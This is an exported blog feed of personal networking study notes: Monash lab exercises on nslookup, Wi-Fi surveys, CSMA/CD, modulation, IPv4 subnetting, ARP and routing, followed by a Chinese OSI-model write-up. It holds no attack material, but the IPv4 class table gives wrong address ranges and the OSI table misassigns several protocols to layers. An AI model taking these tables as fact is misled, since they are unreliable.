<li>Open Firefox in the VM and visit the Monash University website by entering<br><code>www.monash.edu</code> in the address bar.</li>
</ol>
<ul>
<li><p>What kind of addressing you used to visit Monash website?<br>Uniform Resource Locator (URL)</p>
</li>
<li><p>The address is used in which layer in the TCP&#x2F;IP protocol stack?<br>Application layer</p>
</li>
</ul>
<ol start="2">
<li>Enter the following command in the VM terminal:<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup www.monash.edu</span><br></pre></td></tr></table></figure></div>
<a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303241203457.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303241203457.jpg" class="lazyload"></a></li>
</ol>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man nslookup</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303241205018.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303241205018.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="Applied"><a href="#Applied" class="headerlink" title="Applied"></a>Applied</h3><h4 id="Activity-1-1"><a href="#Activity-1-1" class="headerlink" title="Activity 1.1"></a>Activity 1.1</h4><p>install a WLAN sniffing tools <a href="http://www.netspotapp.com/">NetSpot</a></p>
<h4 id="Activity-1-2"><a href="#Activity-1-2" class="headerlink" title="Activity 1.2"></a>Activity 1.2</h4><ol>
<li>Create a list of available wireless access points and observe the characteristics such as SSID, MAC Address, Signal Strength, Signal to Noise Ratio (SNR), Frequency Band, Mode, Security, etc.</li>
</ol>
<table>
<thead>
<tr>
<th>SSID</th>
<th>MAC Address</th>
<th>Signal Strength</th>
<th>Signal to Noise Ratio</th>
<th>Frequency Band</th>
<th>Mode</th>
<th>Security</th>
</tr>
</thead>
<tbody><tr>
<td>Mxxx Guest Wi-Fi</td>
<td>F4:DB:E6:0C:6A:AE</td>
<td>-49~-91</td>
<td></td>
<td>5 or 2.4</td>
<td>ac</td>
<td>Open</td>
</tr>
</tbody></table>
<p>AC refers to Wi-Fi 5 (802.11ac)<br>AX refers to Wi-Fi 6 (802.11ax).<br>n refers to 802.11n (Wireless-N operates on both the 2.4GHz and 5GHz)</p>
<h3 id="Workshop"><a href="#Workshop" class="headerlink" title="Workshop"></a>Workshop</h3><h4 id="activity-A-Media-Access-Control"><a href="#activity-A-Media-Access-Control" class="headerlink" title="activity A: Media Access Control"></a>activity A: Media Access Control</h4><ol>
<li>Explain the three components of CSMA&#x2F;CD Media Access Control (MAC) protocols in Ethernet networks: CS, MA, and CD<br>CSMA&#x2F;CD stands for Carrier Sense Multiple Access with Collision Detection, which is a media access control protocol used in Ethernet networks. It has three main components:</li>
</ol>
<ul>
<li><p>CS (Carrier Sense): Before sending data, a device checks if the network is idle. If it is, the device can transmit its data. If the network is busy, the device waits until it is idle.</p>
</li>
<li><p>MA (Multiple Access): Ethernet networks allow multiple devices to share the same network medium. When multiple devices attempt to transmit data at the same time, collisions can occur.</p>
</li>
<li><p>CD (Collision Detection): If two devices start transmitting data at the same time and their signals collide, both devices detect the collision and stop transmitting. They then wait a random amount of time before attempting to transmit again.</p>
</li>
</ul>
<ol start="2">
<li><p>Explain the difference between the Shared Ethernet with Switched Ethernet.</p>
</li>
<li><p>Explain the media access control mechanism of IEEE 802.11 wireless network,CSMA&#x2F;CA.</p>
</li>
</ol>
<h4 id="activity-b"><a href="#activity-b" class="headerlink" title="activity b"></a>activity b</h4><hr>
<h2 id="week6"><a href="#week6" class="headerlink" title="week6"></a>week6</h2><h3 id="Applied-1"><a href="#Applied-1" class="headerlink" title="Applied"></a>Applied</h3><h4 id="FM-Frequency-Modulation-x2F-encoding"><a href="#FM-Frequency-Modulation-x2F-encoding" class="headerlink" title="FM Frequency Modulation&#x2F;encoding"></a>FM Frequency Modulation&#x2F;encoding</h4><p>An encoding table is a table that for each symbol shows the parameters of the modulation signal.</p>
<table>
<thead>
<tr>
<th>Symbol</th>
<th>Frequency</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1hz</td>
</tr>
<tr>
<td>1</td>
<td>2hz</td>
</tr>
</tbody></table>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202304030832973.jpg" data-fancybox="group" data-caption="1bit FM" class="fancybox"><img alt="1bit FM" title="1bit FM" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202304030832973.jpg" class="lazyload"></a></p>
<ul>
<li>for the first symbol: 0 we will have the signal 𝑦 &#x3D; 𝐴 ⋅ 𝑠𝑖𝑛(2𝜋𝑓1𝑥 + 𝜙)</li>
<li>for the second symbol: 1 we will have the signal 𝑦 &#x3D; 𝐴 ⋅ 𝑠𝑖𝑛(2𝜋𝑓2𝑥 + 𝜙)</li>
<li>for the third symbol: 0 we will have the signal 𝑦 &#x3D; 𝐴 ⋅ 𝑠𝑖𝑛(2𝜋𝑓1𝑥 + 𝜙)</li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202304030838973.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202304030838973.jpg" class="lazyload"></a></p>
<h4 id="PM-Phase-Modulation-x2F-encoding"><a href="#PM-Phase-Modulation-x2F-encoding" class="headerlink" title="PM Phase Modulation&#x2F;encoding"></a>PM Phase Modulation&#x2F;encoding</h4><table>
<thead>
<tr>
<th>Symbol</th>
<th>Frequency</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>45&amp;deg; &#x3D; $\frac{\pi}{4}$</td>
</tr>
<tr>
<td>1</td>
<td>225&amp;deg; &#x3D; $\frac{5\pi}{4}$</td>
</tr>
</tbody></table>
<h4 id="AM-Amplitude-Modulation-x2F-encoding"><a href="#AM-Amplitude-Modulation-x2F-encoding" class="headerlink" title="AM Amplitude Modulation&#x2F;encoding"></a>AM Amplitude Modulation&#x2F;encoding</h4><h4 id="Amplitude-Phase-Modulation"><a href="#Amplitude-Phase-Modulation" class="headerlink" title="Amplitude + Phase Modulation"></a>Amplitude + Phase Modulation</h4><hr>
<h2 id="week7"><a href="#week7" class="headerlink" title="week7"></a>week7</h2><h3 id="applied-网络层-IP"><a href="#applied-网络层-IP" class="headerlink" title="applied 网络层 IP"></a>applied 网络层 IP</h3><p>IP 分片, <a href="https://datatracker.ietf.org/doc/html/rfc791#page-10">封包</a><br>a) <strong>What is the purpose of an IP address?</strong><br>An IP (Internet Protocol) address is a <code>unique numerical identifier</code> assigned to each device connected to the internet, such as a computer, smartphone, or router. Its purpose is to provide a way for devices to communicate with each other over the internet.</p>
<p>b) <strong>What is the size of Source and Destination Address fields?</strong><br><code>IPv4</code>, the Source and Destination Address fields are each 32 bits<br><code>IPv6</code>, 128bits</p>
<p>c) <strong>What is the total number of possible IPv4 Addresses?</strong><br>$2^{32}$</p>
<p>d) If the binary representation of an IP address is as follows what is the dotted<br>decimal notation of the address?<br>11001010000010010101111110111100<br>↓<br>11001010 | 00001001 | 01011111 | 10111100<br>202.9.95.188.</p>
<h3 id="Answer-the-following-questions"><a href="#Answer-the-following-questions" class="headerlink" title="Answer the following questions"></a>Answer the following questions</h3><p>regarding IPv4 addresses<br>a) <strong>Explain Classful addressing.</strong><br>Classful addressing is an addressing scheme used in IPv4 where the address space is divided into five classes: A, B, C, D, and E. Each class has a fixed range of address space allocated to it and is identified by the value of the first few bits of the address. Class A addresses have the first bit set to 0, Class B addresses have the first two bits set to 10, and Class C addresses have the first three bits set to 110. Classes D and E are reserved for special purposes.</p>
<table>
<thead>
<tr>
<th>IPv4</th>
<th>Address</th>
<th>Port start</th>
</tr>
</thead>
<tbody><tr>
<td>Class A</td>
<td>0xxxxxxx</td>
<td>0~127</td>
</tr>
<tr>
<td>Class B</td>
<td>10xxxxxx</td>
<td>128~171</td>
</tr>
<tr>
<td>Class C</td>
<td>110xxxxx</td>
<td>172~203</td>
</tr>
<tr>
<td>Class D</td>
<td>1110xxxx</td>
<td>204~219</td>
</tr>
<tr>
<td>Class E</td>
<td>11110xxx</td>
<td>220~227</td>
</tr>
</tbody></table>
<p>b) <strong>Explain Classless addressing.</strong><br>Classless addressing is an addressing scheme used in IPv4 where the address space is not divided into fixed classes. Instead, the address space is divided into variable-length prefixes, which can be used to assign addresses to networks of different sizes. Classless addressing is also referred to as Classless Inter-Domain Routing (CIDR)</p>
<p>无类别寻址是 IPv4 中使用的一种寻址方案，其中地址空间未划分为固定类别。 相反，地址空间被划分为可变长度的前缀，可用于将地址分配给不同规模的网络。 无类寻址也称为无类域间路由 (CIDR)。</p>
<p>c) <strong>Why Classless addressing is used instead of Classful addressing?</strong></p>
<p>Classless addressing is used instead of Classful addressing because it allows for more efficient use of the available address space. In Classful addressing, address space is allocated in fixed blocks, which can lead to wastage of addresses if a network does not need the full block of addresses. Classless addressing, on the other hand, allows for the allocation of only the required number of addresses, reducing address wastage and increasing the efficiency of address usage.</p>
<p>使用无类寻址而不是有类寻址，因为它允许更有效地使用可用地址空间。 在分类寻址中，地址空间以固定块的形式分配，如果网络不需要完整的地址块，这会导致地址浪费。 另一方面，无类寻址允许只分配所需数量的地址，减少地址浪费并提高地址使用效率。</p>
<p>d) How is network and host part of an IP address identified in Classless addressing?</p>
<p>In Classless addressing, the network and host part of an IP address are identified by a subnet mask. The subnet mask specifies the number of bits used to identify the network portion of the address and the number of bits used to identify the host portion of the address. For example, a subnet mask of 255.255.255.0 (in dotted decimal notation) indicates that the first 24 bits of the IP address represent the network portion and the last 8 bits represent the host portion. The subnet mask is used to determine the network address and the host address of an IP address.</p>
<p>在无类寻址中，IP 地址的网络和主机部分由子网掩码标识。 子网掩码指定用于标识地址网络部分的位数和用于标识地址主机部分的位数。 例如，子网掩码 255.255.255.0（点分十进制表示法）表示 IP 地址的前 24 位代表网络部分，后 8 位代表主机部分。 子网掩码用于确定IP地址的网络地址和主机地址。</p>
<h3 id="IP-mask"><a href="#IP-mask" class="headerlink" title="IP mask"></a>IP mask</h3><p>For each of the following Classless IPv4 addresses and their corresponding subnet masks, find out the network address, <code>the subnet’s broadcast address</code>, and the number of usable addresses in that subnet.</p>
<p>a) <strong>IP address: 192.168.13.23, netmask: 255.255.0.0</strong><br>netmask: 255.255.0.0 -&gt;  first 16 bits of the IP address represent the network portion, and the last 16 bits represent the host portion.</p>
<p>Network address: 192.168.0.0</p>
<p>Broadcast address: 192.168.255.255<br><code>广播地址全为1</code> 0 -&gt; 1</p>
<p>Number of usable addresses: 65,534<br>2^(number of bits in host portion of subnet mask) - 2</p>
<p>b) <strong>IP address: 130.194.77.37 netmask: 0xfffffe00</strong><br>ff,ff,fe,00 -&gt; 255.255.254.0<br>first 23 bits -&gt; network portion<br>last 9 bits -&gt; host portion (0.0.1.255)</p>
<p>Network address: 130.194.76.0<br><code>76.0</code> -&gt; <code>0100 1100, 0000 0000</code><br>Broadcast address: 130.194.77.255</p>
<p>Number of usable addresses: 510<br>$2^9$-2</p>
<p>c) <strong>IP address 130.194.66.77 netmask: &#x2F;26</strong><br>The <code>netmask /26</code> indicates that the first 26 bits are the network bits and the remaining 6 bits are the host bits.</p>
<p>IP address:    130.194.66.77<br>Subnet mask:   &#x2F;26<br>Network addr:  130.194.66.64<br>64 &#x3D; 01<font color="blue">00 0000</font></p>
<p>Broadcast addr:130.194.66.127<br>127 &#x3D; 01<font color="red">11 1111</font></p>
<p>Number of usable addresses: $2^6$-2 &#x3D; 62</p>
<h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><ul>
<li><p>Why was the restriction to 3 classes (A,B,C) a problem for the network?<br>For many companies class C is too small but class B is to large<br>Class A networks were too big to be different</p>
</li>
<li><p>In Network layer Addressing, Internet Protocol Version (IPv4) addresses, Classful addressing is replaced with:<br><code>Classless addressing</code></p>
</li>
<li><p>In Address Resolution Protocol (ARP), the request message is encapsulated as a:<br><code>Data Link frame</code></p>
</li>
<li><p>ARP request is sent as a broadcast message, the reply is:<br><code>Unicast message</code></p>
</li>
<li><p>Mapping a name to an address or an address to a name is called:<br><code>Name-address Resolution</code></p>
</li>
</ul>
<h3 id="ACTIVITY-A-Address-Resolution"><a href="#ACTIVITY-A-Address-Resolution" class="headerlink" title="ACTIVITY A: Address Resolution"></a>ACTIVITY A: Address Resolution</h3><ol>
<li>Explain how application layer addresses (e.g. <a href="http://www.monash.edu/">www.monash.edu</a> or <a href="mailto:&#106;&#x73;&#x6d;&#x69;&#x74;&#x68;&#64;&#x66;&#111;&#111;&#46;&#x63;&#x6f;&#109;">&#106;&#x73;&#x6d;&#x69;&#x74;&#x68;&#64;&#x66;&#111;&#111;&#46;&#x63;&#x6f;&#109;</a>) are resolved to IP addresses and why is this necessary.</li>
</ol>
<p>URL -&gt; DNS analysis route get the IP request </p>
<ol start="2">
<li>Explain how IP addresses are resolved to MAC addresses (in Ethernet) and why is this necessary</li>
</ol>
<hr>
<h2 id="week8"><a href="#week8" class="headerlink" title="week8"></a>week8</h2><h3 id="Types-of-decentralized-Routing"><a href="#Types-of-decentralized-Routing" class="headerlink" title="Types of decentralized Routing"></a>Types of decentralized Routing</h3><ol>
<li><p>Distance-vector routing 距离向量路由<br>node calculates the <code>shortest path</code> to other nodes in the network based on the distance metric such as hop count, delay, or bandwidth.<br>节点根据跳数、延迟或带宽等距离度量计算到网络中其他节点的“最短路径”。<br>Examples:<br> <code>Routing Information Protocol</code> (RIP)<br> <code>Interior Gateway Routin Protocol</code> (IGRP).</p>
</li>
<li><p>Path-vector routing 路径向量路由<br>each node maintains a list of autonomous systems that packets must traverse to reach their destination. This type of routing is commonly used in large-scale networks such as the Internet, where multiple autonomous systems are involved in routing traffic between different regions.<br>每个节点都维护一个自治系统列表，数据包必须经过这些系统才能到达目的地。 这种类型的路由通常用于大型网络（例如 Internet），其中涉及多个自治系统以在不同区域之间路由流量。<br> Eg:<br> <code>Border Gateway Protocol</code> (BGP)<br> <code>Path Vector Protocol</code> (PVP)</p>
</li>
<li><p>Link-state routing 链路状态路径选择<br>decentralized networks where each node shares information about its neighbors and the status of its links with all other nodes in the network.  Using <code>Dijkstra&#39;s algorithm</code><br>分散式网络，其中每个节点共享有关其相邻的信息及其与网络中所有其他节点的链接状态。 使用“Dijkstra 算法”<br>Eg:<br> <code>Open Shortest Path First</code> (OSPF)<br> <code>Intermediate System to Intermediate System</code> (IS-IS). 中级(中间)系统到中级系统</p>
</li>
<li><p>Source routing 源路由选择<br> the source node specifies the path that packets should take to reach their destination. This approach allows for more control over the routing of packets but can be more complex and less scalable than other routing algorithms.<br> 用于分散网络的路由算法，其中源节点指定数据包到达目的地应采用的路径。 这种方法允许对数据包路由进行更多控制，但与其他路由算法相比可能更复杂且可扩展性更差。<br> Eg:<br>  <code>Multiprotocol Label Switching</code> (MPLS) 多协议标签交换<br>  <code>Source-Tree Adaptive Routing</code> (STAR) 源树自适应路由</p>
</li>
</ol>
<h3 id="Compare-Distance-Vector-and-Link-state-Routing-protocol"><a href="#Compare-Distance-Vector-and-Link-state-Routing-protocol" class="headerlink" title="Compare Distance Vector and Link state Routing protocol"></a>Compare Distance Vector and Link state Routing protocol</h3><table>
<thead>
<tr>
<th>Distance Vector距离矢量协议</th>
<th>Link state链路状态协议</th>
</tr>
</thead>
<tbody><tr>
<td>simpler to implement and use less bandwidth, but may take longer to converge in large networks</td>
<td>require more processing power and bandwidth, but can converge more quickly and provide more accurate routing information.</td>
</tr>
<tr>
<td>更容易实现并且使用更少的带宽，但可能需要更长的时间才能在大型网络中收敛</td>
<td>需要更多的处理能力和带宽，但可以更快地收敛并提供更准确的路由信息</td>
</tr>
<tr>
<td>距离矢量路由协议的一个示例是路由信息协议 (RIP)，它通常用于中小型网络。 RIP 根据节点间的跳数计算到达目的地的最佳路径，并通过向其邻居广播其整个路由表每 30 秒更新一次路由表。</td>
<td>链路状态路由协议的一个示例是开放最短路径优先 (OSPF) 协议，它通常用于大型企业网络。 OSPF 依赖于每个节点将有关其本地连接的信息广播到网络中的所有其他节点，这些信息用于构建网络拓扑的完整地图。 然后使用此信息使用 Dijkstra 算法计算到目的地的最短路径。</td>
</tr>
</tbody></table>
<h3 id="Router-amp-switch"><a href="#Router-amp-switch" class="headerlink" title="Router &amp; switch"></a>Router &amp; switch</h3><p><strong>Router 路由器</strong>： 位于网络层，根据目标地址将数据包从一个网络传输到另一个网络，并负责在不同的网络之间转发数据。路由器通常使用路由协议来建立和维护路由表，以便选择最佳路径将数据包传输到目标网络。</p>
<p><strong>Switch 交换机</strong>： 数据链路层，在局域网内转发数据包，通过学习 <code>MAC地址</code> 并将数据包转发到适当的端口来实现局域网内的通信。交换机通常使用 <code>MAC地址表</code> 来决定将数据包转发到哪个端口。</p>
<p><em>(技术迭代更新)，现在大部分路由器和交换机具有多层功能，可以在多个层次上工作。</em><br>路由器和交换机可以支持在第四层（传输层）和第七层（应用层）上执行负载平衡和流量控制。</p>
]]></content>
      <categories>
        <category>Monash笔记</category>
      </categories>
      <tags>
        <tag>Monash Cs</tag>
      </tags>
  </entry>
  <entry>
    <title>OSI 七层模型的学习笔记</title>
    <url>/yakko117/2020/01/07/OSI%E4%B8%83%E5%B1%82%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="OSI-七层模型和TCP-x2F-IP模型及对应协议"><a href="#OSI-七层模型和TCP-x2F-IP模型及对应协议" class="headerlink" title="OSI 七层模型和TCP&#x2F;IP模型及对应协议"></a>OSI 七层模型和TCP&#x2F;IP模型及对应协议</h1><h2 id="一张图概括"><a href="#一张图概括" class="headerlink" title="一张图概括"></a>一张图概括</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/aaa.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/aaa.jpg" class="lazyload"></a></p>
<hr>
<h2 id="OSI七层网络模型"><a href="#OSI七层网络模型" class="headerlink" title="OSI七层网络模型"></a>OSI七层网络模型</h2><p>OSI（Open System Interconnection）开放系统互连参考模型是国际标准化组织（ISO）制定的一个用于计算机或通信系统间互联的标准体系。</p>
<table>
<thead>
<tr>
<th align="center">OSI七层模型</th>
<th>功能</th>
<th>对应的网络协议</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>应用层</strong></td>
<td>应用层是网络体系中最高的一层，也是唯一面向用户的一层，也可视为为用户提供常用的应用程序，每个网络应用都对应着不同的协议</td>
<td>HTTP，TFTP，FTP，NFS，WAIS，SMTP</td>
</tr>
<tr>
<td align="center"><strong>表示层</strong></td>
<td>主要负责数据格式的转换，确保一个系统的应用层发送的消息可以被另一个系统的应用层读取，编码转换，数据解析，管理数据的解密和加密，同时也对应用层的协议进行翻译</td>
<td>Telnet，Rlogin，SNMP， Gopher</td>
</tr>
<tr>
<td align="center"><strong>会话层</strong></td>
<td>负责网络中两节点的建立，在数据传输中维护计算机网络中两台计算机之间的通信连接，并决定何时终止通信</td>
<td>SMTP，DNS</td>
</tr>
<tr>
<td align="center"><strong>传输层</strong></td>
<td>是整个网络关键的部分，是实现两个用户进程间端到端的可靠通信，处理数据包的错误等传输问题。是向下通信服务最高层，向上用户功能最底层。即向网络层提供服务，向会话层提供独立于网络层的传送服务和可靠的透明数据传输.</td>
<td>TCP，UDP</td>
</tr>
<tr>
<td align="center"><strong>网络层</strong></td>
<td>进行逻辑地址寻址，实现不同网络之间的路径选择，IP就在网络层</td>
<td>IP，ICMP，ARP，RARP，AKP，UUCP</td>
</tr>
<tr>
<td align="center"><strong>数据链路层</strong></td>
<td>物理地址（MAC地址），网络设备的唯一身份标识。建立逻辑连接、进行硬件地址寻址，相邻的两个设备间的互相通信</td>
<td>FDDI，Ethernet，Arpanet，PDN，SLIP，PPP，STP。HDLC，SDLC，帧中继</td>
</tr>
<tr>
<td align="center"><strong>物理层</strong></td>
<td>七层模型中的最底层，主要是物理介质传输媒介（网线或者是无线），在不同设备中传输比特，将0&#x2F;1信号与电信号或者光信号互相转化</td>
<td>IEEE 802.1A，IEEE 802.2到IEEE 802</td>
</tr>
</tbody></table>
<p>数据发送时从上至下封装，收到数据包后从下至上解包。</p>
<hr>
<h2 id="TCP-x2F-IP四层模型"><a href="#TCP-x2F-IP四层模型" class="headerlink" title="TCP&#x2F;IP四层模型"></a>TCP&#x2F;IP四层模型</h2><p>TCP&#x2F;IP四层模型：TCP&#x2F;IP参考模型是计算机网络的祖父ARPANET和其后继的因特网使用的参考模型。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1ganq3uv186j307w075tan.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1ganq3uv186j307w075tan.jpg" class="lazyload"></a></p>
<hr>
<h2 id="中继系统"><a href="#中继系统" class="headerlink" title="中继系统"></a>中继系统</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1ganq3usp55j319u0q3jt2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1ganq3usp55j319u0q3jt2.jpg" class="lazyload"></a></p>
<p>完成中继功能的节点通常称为中继系统。在OSI七层模型中，处于不同层的中继系统具有不同的名称。<br>一个设备工作在哪一层，关键看它工作时利用哪一层的数据头部信息。网桥工作时，是以MAC头部来决定转发端口的，因此显然它是数据链路层的设备。<br>具体说:<br><strong>物理层</strong>：网卡，网线，集线器，中继器，调制解调器</p>
<p><strong>数据链路层</strong>：网桥，交换机</p>
<p><strong>网络层</strong>：路由器</p>
<p>网关工作在第四层传输层及其以上</p>
<p>集线器是物理层设备,采用广播的形式来传输信息。</p>
<p>交换机就是用来进行报文交换的机器。多为链路层设备(二层交换机)，能够进行地址学习，采用存储转发的形式来交换报文.。</p>
<p>路由器的一个作用是连通不同的网络，另一个作用是选择信息传送的线路。选择通畅快捷的近路，能大大提高通信速度，减轻网络系统通信负荷，节约网络系统资源，提高网络系统畅通率。 </p>
<hr>
<h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a><strong>物理层</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在OSI参考模型中，物理层（Physical Layer）是参考模型的最低层，也是OSI模型的第一层。</span><br></pre></td></tr></table></figure></div>

<p>　　物理层的主要功能是：利用传输介质 <code>为数据链路层提供物理连接</code> ，实现比特流的透明传输。实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异。使其上面的数据链路层不必考虑网络的具体传输介质是什么。“透明传送比特流”表示经实际电路传送后的比特流没有发生变化。</p>
<p>　　物理层的任务就是为它的上一层提供一个物理连接，以及它们的机械、电气、功能和规程特性。如规定使用电缆和接头的类型、传送信号的电压等。在这一层，数据还没有被组织，仅作为原始的位流或电气电压处理，单位是bit。</p>
<p>　　<strong>【物理层为苦逼的搬运工：它的主要作用是传输比特流，外面来比特流就将它传给数据链路层、数据链路层来比特流就将它传到外边去（比特流：就是由1、0转化为电流强弱来进行传输,到达目的地后在转化为1、0，也就是我们常说的模数转换与数模转换）】</strong></p>
<hr>
<h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a><strong>数据链路层</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">　　数据链路层（Datalink Layer）是OSI参考模型的第二层。</span><br></pre></td></tr></table></figure></div>

<p>　　它控制网络层与物理层之间的通信，是一个桥梁。它的主要功能是 <code>如何在不可靠的物理线路上进行数据的可靠传递。</code></p>
<p>　　为了保证传输，从网络层接收到的数据被 <code>分割成特定的可被物理层传输的帧</code>。</p>
<p>　　帧是用来移动数据的结构包，它包括：<code>原始数据；发送方、接收方的物理地址（确定了帧将发送到何处）；纠错和控制信息（确保帧无差错到达）</code></p>
<p>　　如果在传送数据时，接收点检测到所传数据中有差错，就要通知发送方重发这一帧。</p>
<p>　　数据链路层的功能独立于网络和它的节点和所采用的物理层类型，它也不关心是否正在运行 <code>Word</code> 、<code>Excel</code> 或使用 <code>Internet</code> 。有一些连接设备，如交换机，由于它们要对帧解码并使用帧信息将数据发送到正确的接收方，所以它们是工作在数据链路层的。数据链路层（DataLinkLayer):在物理层提供比特流服务的基础上，建立相邻结点之间的数据链路，通过差错控制提供数据帧（Frame）在信道上无差错的传输，并进行各电路上的动作系列。<code>数据链路层在不可靠的物理介质上提供可靠的传输。</code></p>
<p>　　<code>该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。</code></p>
<p>　　<strong>【数据链路层为中间沟通人：主要任务桥梁（分割、传递、监控。。。）】</strong></p>
<hr>
<h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a><strong>网络层</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网络层（Network Layer）是OSI参考模型的第三层。（即NDIS）</span><br></pre></td></tr></table></figure></div>

<p>　　其 <code>主要功能是将网络地址翻译成对应的物理地址，并决定如何将数据从发送方路由到接收方。</code></p>
<p>　　网络层通过综合考虑发送优先权、网络拥塞程度、服务质量以及可选路由的花费来决定从一个网络中节点A 到另一个网络中节点B 的最佳路径。<br>　　由于网络层处理，并智能指导数据传送，路由器连接网络各段，所以路由器属于网络层。网络负责在源机器和目标机器之间建立它们所使用的路由。这一层本身没有任何错误检测和修正机制，因此，网络层必须依赖于端端之间的由DLL提供的可靠传输服务。<br>     简单的来说就是在网络中找到一条路径，一段一段地传送，由于数据链路层保证两点之间的数据是正确的，因此源到目的地的数据也是正确的，这样一台机器上的信息就能传到另外一台了。但计算机网络的最终用户不是主机，而是主机上的某个应用进程。这个过程由传输层实现。</p>
<hr>
<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a><strong>传输层</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传输层（Transport Layer）是OSI参考模型的第四层。（即TCP）</span><br></pre></td></tr></table></figure></div>
<p>　　传输协议同时进行流量控制或是基于接收方可接收数据的快慢程度 <code>规定适当的发送速率</code>。除此之外，传输层按照网络能处理的最大尺寸 <code>将较长的数据包进行强制分割（标记整理成有序的包</code>）。<br>　　例如，以太网无法接收大于1500字节(Byte)的数据包。发送方节点的传输层将数据分割成较小的数据片，同时对每一数据片安排一序列号，以便数据到达接收方节点的传输层时，能以正确的顺序重组。该过程即被称为排序。工作在传输层的一种服务是TCP&#x2F;IP协议套中的TCP(传输控制协议)，另一项传输层服务是IPX&#x2F;SPX协议集的SPX(序列包交换)。<br>      网络层交给传输层后，传输层必需标识了服务是哪个进程请求的，要交给谁的问题。我把东西交你时，希望通知你一下，就是会话层的工作。<br>　　<strong>【运输层为项目总指挥：主要任务为将大项目分割并标识为有序的小项目、规定项目完成速率。】</strong>
　　</p>
<hr>
<h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a><strong>会话层</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">会话层（Session Layer）是OSI参考模型的第五层。（即SPI）</span><br></pre></td></tr></table></figure></div>

<p>　　<code>负责在网络中的两节点之间建立、维持和终止通信。</code></p>
<p>　　 会话层的功能包括：建立通信链接，保持会话过程通信链接的畅通，同步两个节点之间的对话，决定通信是否被中断以及通信中断时决定从何处重新发送。</p>
<p>　　你可能常常听到有人把会话层称作网络通信的“交通警察”。当通过拨号向你的 <code>ISP</code> （因特网服务提供商）请求连接到因特网时，<code>ISP 服务器</code>上的会话层向你与你的 <code>PC客户机</code> 上的会话层进行协商连接。若你的电话线偶然从墙上插孔脱落时，你终端机上的会话层将检测到连接中断并重新发起连接。会话层通过决定节点通信的优先级和通信时间的长短来设置通信期限。</p>
<p>　　SPI是服务提供者接口，管理用户间的会话和对话；控制用户间的连接和挂断连接；报告上层错误</p>
